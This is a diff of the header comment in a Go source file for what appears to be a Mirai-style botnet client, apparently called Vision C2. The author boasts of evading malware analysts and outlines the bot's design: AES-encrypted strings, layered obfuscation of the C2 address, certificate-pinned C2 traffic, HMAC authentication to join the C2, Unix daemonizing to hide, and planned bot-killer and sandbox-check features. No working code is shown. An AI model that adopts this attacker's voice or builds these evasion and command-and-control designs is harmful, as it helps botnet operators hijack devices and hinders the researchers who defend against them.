@@ -6,19 +6,28 @@
 //  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║    ██║     ██╔═══╝
 //   ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║    ╚██████╗███████╗
 //    ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚══════╝
-//													
+//		
+//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check; 
 // ============================================================================
 //
-//  Listen. I studied the greats. I pulled apart dozens of Mirai variants line by line. I traced
-//  Aisuru/Kimwolf across continents. I watched script kiddies get their C2
+//  Listen I pulled apart dozens of Mirai variants line by line. I read every xlabs
+//  and Krebs post about Unix Backdoors I could. I watched script kiddies get their C2
 //  address decrypted in a hour by some random blog writer claiming to be a "whitehat".
-//  We can do this different.
-//
+//	You're shitty little XOR tables are no better then plaintext.
+//  We can do better.
 //
 //  Every layer of obfuscation is a middle finger to every analyst who thought they'd have an easy day. 
 //  Every string in this binary is encrypted. AES-128-CTR. Zero plaintext.
 //  You throw it in strings? You get nothing. The address resolution alone is five layers deep — Base64 into XOR
 //  into RC4 into substitution into MD5 verification back through AES. 
+//
+//  Comms are TLS-pinned server cert fingerprint baked into the binary. You
+//  MITM this and the handshake dies before you see anything. No trust-on-first-use
+//  garbage. Pin doesn't match? Bot walks away silent. 
+//
+//  HMAC challenge-response. Server sends a nonce, bot proves it knows the key without ever sending it. No key, no joining the c2.
+//  Replay old auth? Nonce is fresh every session. This isn't Mirai's plaintext
+//  password-over-TCP clown show.
 //
 //  It daemonizes like a proper Unix citizen. Fork. Setsid. Redirect every
 //  file descriptor to /dev/null. Mask the signals. Disappear into the
@@ -42,9 +51,9 @@
 //  until every syscall, every socket option, every evasion technique lives
 //  in your muscle memory. That's what this is.
 //
-//
+//										
 //                                                        ~ Sin Too Much
-//
+//	PS just run Setup.py 
 // ============================================================================
 
 package main
